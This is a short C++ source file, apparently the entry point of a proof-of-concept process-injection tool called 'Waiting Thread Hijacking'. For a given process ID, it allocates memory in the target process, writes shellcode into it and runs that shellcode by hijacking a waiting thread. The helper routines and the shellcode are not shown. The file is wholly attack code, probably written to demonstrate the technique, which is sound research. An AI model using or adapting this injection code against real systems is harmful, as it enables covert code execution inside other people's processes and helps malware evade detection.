#include <windows.h>
#include <iostream>

#include "hijacking.h"
#include "common.h"
#include "ntddk.h"

DWORD g_WaitReason = WrQueue;

inline bool execute_injection(DWORD processID)
{
    LPVOID shellcodePtr = alloc_memory_in_process(processID);
    bool isOk = write_shc_into_process(processID, shellcodePtr);
    if (!isOk) return false;
    return run_injected(processID, (ULONG_PTR)shellcodePtr, g_WaitReason);
}

int main(int argc, char* argv[])
{
    if (argc < 2) {
        std::cout << "Waiting Thread Hijacking. Target Wait Reason: " << KWAIT_REASON_TO_STRING(g_WaitReason) << "\n"
            << "Arg <PID>" << std::endl;
        return 0;
    }
    DWORD processID = loadInt(argv[1], false);
    if (!processID) {
        std::cerr << "No process ID supplied!\n";
        return -1;
    }
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, processID);
    if (!hProcess) {
        std::cerr << "Failed opening the process!\n";
        return 0;
    }
    CloseHandle(hProcess);

    int status = 0;
    if (execute_injection(processID)) {
        std::cout << "Done!\n";
    }
    else {
        std::cout << "Failed!\n";
        status = (-1);
    }
    return status;
}
